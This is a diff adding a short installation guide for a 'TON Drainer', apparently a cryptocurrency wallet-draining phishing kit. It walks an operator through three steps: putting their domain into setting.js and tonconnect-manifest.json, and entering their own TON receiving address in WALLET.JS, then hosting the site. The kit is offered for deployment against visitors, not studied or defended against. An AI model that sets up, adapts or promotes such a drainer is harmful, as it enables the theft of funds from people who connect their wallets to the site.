@@ -1,0 +1,23 @@
+Installation TON Drainer on any website
+
+
+#STEP 1
+Replace yourdomain.com in setting.js for your own domains
+ */
+let ton_manifest_url = "https://yourdomain.com/tonconnect-manifest.json";
+
+
+#STEP 2
+You need to modify tonconnect-manifest.json and replace your domain
+
+You can also modify the inconUrl if u want.
+
+
+#STEP 3
+Setup your information in WALLET.JS in the bottom (YOURWEBSITE.COM,YOURTONADRESS)
+
+All is setup you can host your website
+
+
+
+
